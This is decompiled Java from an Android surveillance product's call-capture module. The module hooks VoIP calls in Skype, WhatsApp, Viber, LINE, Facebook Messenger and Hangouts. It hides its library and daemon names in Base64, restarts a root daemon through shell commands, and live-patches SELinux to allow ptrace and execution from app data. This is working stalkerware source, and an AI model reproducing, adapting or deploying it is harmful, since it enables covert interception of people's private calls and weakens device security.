package com.vvt.al;

import android.content.Context;
import android.os.Build.VERSION;
import android.os.SystemClock;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map.Entry;
import java.util.Set;

public class d
  implements i
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static final String c = com.vvt.ag.b.g("bGlidmNhcC5zbw==");
  private static final String d = com.vvt.ag.b.g("dmRhZW1vbg==");
  private static final String e = com.vvt.ag.b.g("Ly52b2lwLy5lbnRyaWVz");
  private static final String f = com.vvt.ag.b.g("Y29tLmZ4LnNvY2tldC52b2lw");
  private static String l = "";
  private static String m = "";
  private static String n = "";
  private static String o = "";
  private e A;
  private com.vvt.h.d B;
  private com.vvt.base.a C;
  private f D;
  private Thread E;
  private com.vvt.n.a.b F;
  private Context G;
  private boolean H;
  private boolean I;
  private boolean J;
  private boolean K;
  private boolean L;
  private boolean M;
  private String g = "";
  private String h = "";
  private RunningMode i;
  private HashMap j;
  private boolean k;
  private com.vvt.al.c.c p;
  private com.vvt.al.f.c q;
  private com.vvt.al.g.c r;
  private com.vvt.al.b.c s;
  private com.vvt.al.a.c t;
  private com.vvt.al.e.c u;
  private e v;
  private e w;
  private e x;
  private e y;
  private e z;
  
  public d(String paramString1, RunningMode paramRunningMode, Context paramContext, com.vvt.base.a parama, String paramString2, com.vvt.n.a.b paramb)
  {
    Object localObject2 = RunningMode.FULL;
    this.i = ((RunningMode)localObject2);
    this.k = false;
    this.H = false;
    this.I = false;
    this.J = false;
    this.K = false;
    this.L = false;
    this.M = false;
    this.G = paramContext;
    this.g = paramString1;
    this.h = paramString2;
    this.i = paramRunningMode;
    localObject2 = new com/vvt/h/a;
    ((com.vvt.h.a)localObject2).<init>();
    RunningMode localRunningMode1 = this.i;
    RunningMode localRunningMode2 = RunningMode.FULL;
    if (localRunningMode1 == localRunningMode2) {}
    for (;;)
    {
      localObject1 = ((com.vvt.h.a)localObject2).a(paramContext, bool);
      this.B = ((com.vvt.h.d)localObject1);
      this.C = parama;
      localObject1 = new java/util/HashMap;
      ((HashMap)localObject1).<init>();
      this.j = ((HashMap)localObject1);
      this.F = paramb;
      localObject1 = com.vvt.io.d.a();
      localObject2 = e;
      l = p.a((String)localObject1, (String)localObject2);
      m = p.a(this.g, "busybox");
      localObject1 = this.g;
      localObject2 = d;
      n = p.a((String)localObject1, (String)localObject2);
      o = G();
      return;
      bool = true;
    }
  }
  
  private void A()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.w;
    if (localObject != null)
    {
      localObject = this.w;
      ((e)localObject).b();
      this.w = null;
    }
    localObject = this.j;
    String str = "com.skype.raider";
    ((HashMap)localObject).remove(str);
    this.u = null;
    bool = a;
    if (bool) {}
  }
  
  private void B()
  {
    boolean bool = a;
    if (bool) {}
    String str1 = "%s -l %s";
    int i1 = 2;
    try
    {
      Object[] arrayOfObject = new Object[i1];
      int i2 = 0;
      String str2 = n;
      arrayOfObject[0] = str2;
      i2 = 1;
      str2 = o;
      arrayOfObject[i2] = str2;
      str1 = String.format(str1, arrayOfObject);
      KMShell.a(str1);
      bool = a;
      if (bool) {}
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  private void C()
  {
    boolean bool = a;
    if (bool) {}
    String str1 = "%s killall %s";
    int i1 = 2;
    try
    {
      Object[] arrayOfObject = new Object[i1];
      int i2 = 0;
      String str2 = m;
      arrayOfObject[0] = str2;
      i2 = 1;
      str2 = d;
      arrayOfObject[i2] = str2;
      str1 = String.format(str1, arrayOfObject);
      KMShell.a(str1);
      bool = a;
      if (bool) {}
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  private void D()
  {
    boolean bool = a;
    if (bool) {}
    C();
    long l1 = 3000L;
    SystemClock.sleep(l1);
    B();
    bool = a;
    if (bool) {}
  }
  
  private void E()
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = b.b(l);
    Iterator localIterator = ((ArrayList)localObject).iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = (com.vvt.al.d.a)localIterator.next();
      boolean bool2 = a;
      if (bool2) {}
      a((com.vvt.al.d.a)localObject);
    }
    localObject = l;
    b.a((String)localObject);
    bool1 = a;
    if (bool1) {}
  }
  
  private void F()
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    boolean bool1 = com.vvt.ad.a.a();
    if (bool1)
    {
      bool1 = a;
      if (bool1) {}
      ((StringBuilder)localObject1).append("supolicy --live ");
      Object localObject2 = System.getProperty("line.separator");
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ((StringBuilder)localObject1).append("\"");
      String str = com.vvt.ag.b.g("YWxsb3cgaW5pdCB1bnRydXN0ZWRfYXBwIHByb2Nlc3MgcHRyYWNl");
      ((StringBuilder)localObject2).append(str).append("\"");
      localObject2 = System.getProperty("line.separator");
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ((StringBuilder)localObject1).append("\"");
      str = com.vvt.ag.b.g("YWxsb3cgdW50cnVzdGVkX2FwcCBzaGVsbF9kYXRhX2ZpbGUgZmlsZSBleGVjdXRl");
      ((StringBuilder)localObject2).append(str).append("\"");
      localObject2 = System.getProperty("line.separator");
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ((StringBuilder)localObject1).append("\"");
      str = com.vvt.ag.b.g("YWxsb3cgaW5pdCBzaGVsbF9kYXRhX2ZpbGUgZmlsZSBsb2Nr");
      ((StringBuilder)localObject2).append(str).append("\"");
      localObject2 = System.getProperty("line.separator");
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ((StringBuilder)localObject1).append("\"");
      str = com.vvt.ag.b.g("aW5pdCBhcHBfZGF0YV9maWxlIGxua19maWxlIHJlYWQ=");
      ((StringBuilder)localObject2).append(str).append("\"");
      localObject2 = System.getProperty("line.separator");
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ((StringBuilder)localObject1).append("\"");
      str = com.vvt.ag.b.g("c2hlbGwgZGFsdmlrY2FjaGVfZGF0YV9maWxlIGZpbGUgd3JpdGU=");
      ((StringBuilder)localObject2).append(str).append("\"");
      localObject2 = System.getProperty("line.separator");
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ((StringBuilder)localObject1).append("\"");
      str = com.vvt.ag.b.g("YWxsb3cgdW50cnVzdGVkX2FwcCBkYWx2aWtjYWNoZV9kYXRhX2ZpbGUgZGlyIHdyaXRl");
      ((StringBuilder)localObject2).append(str).append("\"");
      localObject2 = System.getProperty("line.separator");
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ((StringBuilder)localObject1).append("\"");
      str = com.vvt.ag.b.g("YWxsb3cgdW50cnVzdGVkX2FwcCB1bnRydXN0ZWRfYXBwIHByb2Nlc3MgeyBleGVjc3RhY2sgfQ==");
      ((StringBuilder)localObject2).append(str).append("\"");
      localObject2 = System.getProperty("line.separator");
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ((StringBuilder)localObject1).append("\"");
      str = com.vvt.ag.b.g("YWxsb3cgdW50cnVzdGVkX2FwcCBzeXN0ZW1fZmlsZSBmaWxlIHsgZXhlY21vZCB9");
      localObject2 = ((StringBuilder)localObject2).append(str);
      str = "\"";
      ((StringBuilder)localObject2).append(str);
      localObject1 = ((StringBuilder)localObject1).toString();
    }
    try
    {
      KMShell.a((String)localObject1);
      boolean bool2 = a;
      if (bool2) {}
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  private String G()
  {
    int i1 = 0;
    String str1 = null;
    boolean bool1 = false;
    String[] arrayOfString = new String[2];
    String str2 = c;
    String str3 = p.a("/system/lib", str2);
    arrayOfString[0] = str3;
    str2 = this.g;
    String str4 = c;
    str2 = p.a(str2, str4);
    arrayOfString[1] = str2;
    int i2 = arrayOfString.length;
    int i3 = 0;
    str3 = null;
    if (i3 < i2)
    {
      str1 = arrayOfString[i3];
      boolean bool2 = ShellUtil.b(str1);
      if (bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      i1 = i3 + 1;
      i3 = i1;
      break;
      i1 = 0;
      str1 = null;
    }
  }
  
  private boolean H()
  {
    boolean bool1 = false;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject = this.i;
    RunningMode localRunningMode = RunningMode.NORMAL;
    if (localObject == localRunningMode)
    {
      bool2 = b;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return bool1;
      bool2 = com.vvt.aa.c.a();
      int i1;
      int i2;
      if (bool2)
      {
        i1 = Build.VERSION.SDK_INT;
        i2 = 23;
        if (i1 < i2) {}
      }
      else
      {
        i1 = Build.VERSION.SDK_INT;
        i2 = 19;
        if (i1 >= i2)
        {
          i1 = Build.VERSION.SDK_INT;
          i2 = 25;
          if (i1 <= i2)
          {
            bool3 = a;
            if (bool3) {}
            localObject = o;
            bool3 = ShellUtil.b((String)localObject);
            if (bool3)
            {
              localObject = n;
              bool3 = ShellUtil.b((String)localObject);
              if (bool3)
              {
                bool1 = a;
                if (bool1) {}
                bool1 = true;
                continue;
              }
            }
            bool3 = b;
            if (!bool3) {
              continue;
            }
            continue;
          }
        }
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
  }
  
  private void a(com.vvt.al.d.a parama)
  {
    Object localObject = this.j;
    int i1 = ((HashMap)localObject).size();
    if (i1 <= 0)
    {
      bool1 = b;
      if (!bool1) {}
    }
    localObject = this.j.entrySet();
    Iterator localIterator = ((Set)localObject).iterator();
    do
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = (Map.Entry)localIterator.next();
      bool2 = a;
      if (bool2) {}
      str1 = (String)((Map.Entry)localObject).getKey();
      String str2 = parama.c;
      bool2 = str1.equalsIgnoreCase(str2);
    } while (!bool2);
    boolean bool2 = a;
    if (bool2) {}
    localObject = (c)((Map.Entry)localObject).getValue();
    String str1 = parama.a;
    long l1 = parama.b;
    ((c)localObject).a(str1, l1);
    boolean bool1 = true;
    for (;;)
    {
      if (!bool1)
      {
        bool1 = b;
        if (bool1) {}
        localObject = parama.a;
        ShellUtil.i((String)localObject);
      }
      return;
      bool1 = false;
      localObject = null;
    }
  }
  
  private boolean i()
  {
    return this.H;
  }
  
  private boolean j()
  {
    return this.I;
  }
  
  private boolean k()
  {
    return this.J;
  }
  
  private boolean l()
  {
    return this.L;
  }
  
  private boolean m()
  {
    return this.M;
  }
  
  private boolean n()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    Object localObject1 = new com/vvt/al/f;
    Object localObject2 = f;
    ((f)localObject1).<init>(this, (String)localObject2);
    this.D = ((f)localObject1);
    localObject1 = new java/lang/Thread;
    localObject2 = this.D;
    ((Thread)localObject1).<init>((Runnable)localObject2);
    this.E = ((Thread)localObject1);
    localObject1 = this.E;
    ((Thread)localObject1).start();
    boolean bool2 = a;
    if (bool2) {}
    return false;
  }
  
  private boolean o()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    f localf = this.D;
    if (localf != null)
    {
      localf = this.D;
      localf.a();
    }
    boolean bool2 = a;
    if (bool2) {}
    return false;
  }
  
  private void p()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = new com/vvt/al/b/c;
    Object localObject2 = this.h;
    Object localObject3 = this.g;
    com.vvt.h.d locald = this.B;
    com.vvt.base.a locala = this.C;
    ((com.vvt.al.b.c)localObject1).<init>((String)localObject2, (String)localObject3, locald, locala);
    this.s = ((com.vvt.al.b.c)localObject1);
    localObject1 = this.j;
    localObject3 = this.s;
    ((HashMap)localObject1).put("com.google.android.talk", localObject3);
    localObject1 = this.i;
    localObject2 = RunningMode.FULL;
    if (localObject1 == localObject2)
    {
      localObject1 = new com/vvt/al/b/a;
      ((com.vvt.al.b.a)localObject1).<init>();
      this.A = ((e)localObject1);
      localObject1 = this.A;
      ((e)localObject1).a(this);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      localObject1 = new com/vvt/al/b/b;
      localObject2 = this.F;
      ((com.vvt.al.b.b)localObject1).<init>((com.vvt.n.a.b)localObject2);
      this.A = ((e)localObject1);
      localObject1 = this.A;
      ((e)localObject1).a(this);
    }
  }
  
  private void q()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = new com/vvt/al/e/c;
    Object localObject2 = this.h;
    Object localObject3 = this.g;
    Object localObject4 = this.B;
    com.vvt.base.a locala = this.C;
    ((com.vvt.al.e.c)localObject1).<init>((String)localObject2, (String)localObject3, (com.vvt.h.d)localObject4, locala);
    this.u = ((com.vvt.al.e.c)localObject1);
    localObject1 = this.j;
    localObject3 = this.u;
    ((HashMap)localObject1).put("com.skype.raider", localObject3);
    localObject1 = this.i;
    localObject2 = RunningMode.FULL;
    if (localObject1 == localObject2)
    {
      localObject1 = new com/vvt/al/e/a;
      ((com.vvt.al.e.a)localObject1).<init>();
      this.w = ((e)localObject1);
      localObject1 = this.w;
      ((e)localObject1).a(this);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      localObject1 = new com/vvt/al/e/b;
      localObject2 = this.F;
      localObject3 = this.g;
      localObject4 = this.h;
      ((com.vvt.al.e.b)localObject1).<init>((com.vvt.n.a.b)localObject2, (String)localObject3, (String)localObject4);
      this.w = ((e)localObject1);
      localObject1 = this.w;
      ((e)localObject1).a(this);
    }
  }
  
  private void r()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = new com/vvt/al/a/c;
    Object localObject2 = this.h;
    Object localObject3 = this.g;
    Object localObject4 = this.B;
    com.vvt.base.a locala = this.C;
    ((com.vvt.al.a.c)localObject1).<init>((String)localObject2, (String)localObject3, (com.vvt.h.d)localObject4, locala);
    this.t = ((com.vvt.al.a.c)localObject1);
    localObject1 = this.j;
    localObject3 = this.t;
    ((HashMap)localObject1).put("com.facebook.orca", localObject3);
    localObject1 = this.i;
    localObject2 = RunningMode.FULL;
    if (localObject1 == localObject2)
    {
      localObject1 = new com/vvt/al/a/a;
      ((com.vvt.al.a.a)localObject1).<init>();
      this.y = ((e)localObject1);
      localObject1 = this.y;
      ((e)localObject1).a(this);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      localObject1 = new com/vvt/al/a/b;
      localObject2 = this.g;
      localObject3 = this.F;
      localObject4 = this.h;
      ((com.vvt.al.a.b)localObject1).<init>((String)localObject2, (com.vvt.n.a.b)localObject3, (String)localObject4);
      this.y = ((e)localObject1);
      localObject1 = this.y;
      ((e)localObject1).a(this);
    }
  }
  
  private void s()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = new com/vvt/al/g/c;
    Object localObject2 = this.h;
    Object localObject3 = this.g;
    com.vvt.h.d locald = this.B;
    com.vvt.base.a locala = this.C;
    ((com.vvt.al.g.c)localObject1).<init>((String)localObject2, (String)localObject3, locald, locala);
    this.r = ((com.vvt.al.g.c)localObject1);
    localObject1 = this.j;
    localObject3 = this.r;
    ((HashMap)localObject1).put("com.whatsapp", localObject3);
    localObject1 = this.i;
    localObject2 = RunningMode.FULL;
    if (localObject1 == localObject2)
    {
      localObject1 = new com/vvt/al/g/a;
      ((com.vvt.al.g.a)localObject1).<init>();
      this.x = ((e)localObject1);
      localObject1 = this.x;
      ((e)localObject1).a(this);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      localObject1 = new com/vvt/al/g/b;
      localObject2 = this.F;
      ((com.vvt.al.g.b)localObject1).<init>((com.vvt.n.a.b)localObject2);
      this.x = ((e)localObject1);
      localObject1 = this.x;
      ((e)localObject1).a(this);
    }
  }
  
  private void t()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = new com/vvt/al/f/c;
    Object localObject2 = this.h;
    Object localObject3 = this.g;
    com.vvt.h.d locald = this.B;
    com.vvt.base.a locala = this.C;
    ((com.vvt.al.f.c)localObject1).<init>((String)localObject2, (String)localObject3, locald, locala);
    this.q = ((com.vvt.al.f.c)localObject1);
    localObject1 = this.j;
    localObject3 = this.q;
    ((HashMap)localObject1).put("com.viber.voip", localObject3);
    localObject1 = this.i;
    localObject2 = RunningMode.FULL;
    if (localObject1 == localObject2)
    {
      localObject1 = new com/vvt/al/f/a;
      ((com.vvt.al.f.a)localObject1).<init>();
      this.v = ((e)localObject1);
      localObject1 = this.v;
      ((e)localObject1).a(this);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      localObject1 = new com/vvt/al/f/b;
      localObject2 = this.F;
      ((com.vvt.al.f.b)localObject1).<init>((com.vvt.n.a.b)localObject2);
      this.v = ((e)localObject1);
      localObject1 = this.v;
      ((e)localObject1).a(this);
    }
  }
  
  private void u()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = new com/vvt/al/c/c;
    Object localObject2 = this.h;
    Object localObject3 = this.g;
    Object localObject4 = this.B;
    Object localObject5 = this.C;
    ((com.vvt.al.c.c)localObject1).<init>((String)localObject2, (String)localObject3, (com.vvt.h.d)localObject4, (com.vvt.base.a)localObject5);
    this.p = ((com.vvt.al.c.c)localObject1);
    localObject1 = this.j;
    localObject3 = this.p;
    ((HashMap)localObject1).put("jp.naver.line.android", localObject3);
    localObject1 = this.i;
    localObject2 = RunningMode.FULL;
    if (localObject1 == localObject2)
    {
      localObject1 = new com/vvt/al/c/a;
      ((com.vvt.al.c.a)localObject1).<init>();
      this.z = ((e)localObject1);
      localObject1 = this.z;
      ((e)localObject1).a(this);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      localObject1 = new com/vvt/al/c/b;
      localObject2 = this.g;
      localObject3 = this.F;
      localObject4 = this.G;
      localObject5 = this.h;
      ((com.vvt.al.c.b)localObject1).<init>((String)localObject2, (com.vvt.n.a.b)localObject3, (Context)localObject4, (String)localObject5);
      this.z = ((e)localObject1);
      localObject1 = this.z;
      ((e)localObject1).a(this);
    }
  }
  
  private void v()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.z;
    if (localObject != null)
    {
      localObject = this.z;
      ((e)localObject).b();
      this.z = null;
    }
    localObject = this.j;
    String str = "jp.naver.line.android";
    ((HashMap)localObject).remove(str);
    this.p = null;
    bool = a;
    if (bool) {}
  }
  
  private void w()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.v;
    if (localObject != null)
    {
      localObject = this.v;
      ((e)localObject).b();
      this.v = null;
    }
    localObject = this.j;
    String str = "com.viber.voip";
    ((HashMap)localObject).remove(str);
    this.q = null;
    bool = a;
    if (bool) {}
  }
  
  private void x()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.x;
    if (localObject != null)
    {
      localObject = this.x;
      ((e)localObject).b();
      this.x = null;
    }
    localObject = this.j;
    String str = "com.whatsapp";
    ((HashMap)localObject).remove(str);
    this.r = null;
    bool = a;
    if (bool) {}
  }
  
  private void y()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.A;
    if (localObject != null)
    {
      localObject = this.A;
      ((e)localObject).b();
      this.A = null;
    }
    localObject = this.j;
    String str = "com.google.android.talk";
    ((HashMap)localObject).remove(str);
    this.s = null;
    bool = a;
    if (bool) {}
  }
  
  private void z()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.y;
    if (localObject != null)
    {
      localObject = this.y;
      ((e)localObject).b();
      this.y = null;
    }
    localObject = this.j;
    String str = "com.facebook.orca";
    ((HashMap)localObject).remove(str);
    this.t = null;
    bool = a;
    if (bool) {}
  }
  
  public void a() {}
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    D();
  }
  
  public void a(String paramString1, String paramString2)
  {
    try
    {
      boolean bool = a;
      if (bool) {}
      D();
      return;
    }
    finally {}
  }
  
  public void a(boolean paramBoolean)
  {
    this.H = paramBoolean;
  }
  
  public void b(boolean paramBoolean)
  {
    this.I = paramBoolean;
  }
  
  public boolean b()
  {
    return this.K;
  }
  
  public void c(boolean paramBoolean)
  {
    this.J = paramBoolean;
  }
  
  public boolean c()
  {
    return this.k;
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    bool = H();
    if (bool)
    {
      bool = c();
      if (!bool)
      {
        bool = a;
        if (!bool) {}
      }
    }
    for (;;)
    {
      try
      {
        bool = i();
        if (bool) {
          u();
        }
        bool = j();
        if (bool) {
          t();
        }
        bool = k();
        if (bool) {
          s();
        }
        bool = l();
        if (bool) {
          r();
        }
        bool = m();
        if (bool) {
          q();
        }
        bool = b();
        if (bool) {
          p();
        }
        F();
        B();
        n();
        E();
        bool = true;
        this.k = bool;
      }
      catch (Exception localException)
      {
        bool = b;
        if (!bool) {
          continue;
        }
        continue;
      }
      bool = a;
      if (bool) {}
      return;
      bool = b;
      if (!bool) {}
    }
  }
  
  public void d(boolean paramBoolean)
  {
    this.K = paramBoolean;
  }
  
  public void e()
  {
    boolean bool = a;
    if (bool) {}
    bool = c();
    if (bool)
    {
      bool = a;
      if (bool) {}
      bool = i();
      if (!bool) {
        break label205;
      }
      Object localObject = this.p;
      if (localObject == null) {
        break label190;
      }
      bool = a;
      if (bool) {}
      bool = j();
      if (!bool) {
        break label235;
      }
      localObject = this.q;
      if (localObject == null) {
        break label220;
      }
      bool = a;
      if (bool) {}
      label77:
      bool = k();
      if (!bool) {
        break label265;
      }
      localObject = this.r;
      if (localObject == null) {
        break label250;
      }
      bool = a;
      if (bool) {}
      label103:
      bool = b();
      if (!bool) {
        break label295;
      }
      localObject = this.s;
      if (localObject == null) {
        break label280;
      }
      bool = a;
      if (bool) {}
      label129:
      bool = l();
      if (!bool) {
        break label325;
      }
      localObject = this.t;
      if (localObject == null) {
        break label310;
      }
      bool = a;
      if (bool) {}
      label155:
      bool = m();
      if (!bool) {
        break label355;
      }
      localObject = this.u;
      if (localObject == null) {
        break label340;
      }
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      label190:
      bool = a;
      if (bool) {}
      u();
      break;
      label205:
      bool = a;
      if (bool) {}
      v();
      break;
      label220:
      bool = a;
      if (bool) {}
      t();
      break label77;
      label235:
      bool = a;
      if (bool) {}
      w();
      break label77;
      label250:
      bool = a;
      if (bool) {}
      s();
      break label103;
      label265:
      bool = a;
      if (bool) {}
      x();
      break label103;
      label280:
      bool = a;
      if (bool) {}
      p();
      break label129;
      label295:
      bool = a;
      if (bool) {}
      y();
      break label129;
      label310:
      bool = a;
      if (bool) {}
      r();
      break label155;
      label325:
      bool = a;
      if (bool) {}
      z();
      break label155;
      label340:
      bool = a;
      if (bool) {}
      q();
      continue;
      label355:
      bool = a;
      if (bool) {}
      A();
    }
  }
  
  public void e(boolean paramBoolean)
  {
    this.L = paramBoolean;
  }
  
  public void f()
  {
    boolean bool = a;
    if (bool) {}
    C();
    o();
    w();
    A();
    x();
    z();
    v();
    y();
    this.k = false;
    bool = a;
    if (bool) {}
  }
  
  public void f(boolean paramBoolean)
  {
    this.M = paramBoolean;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */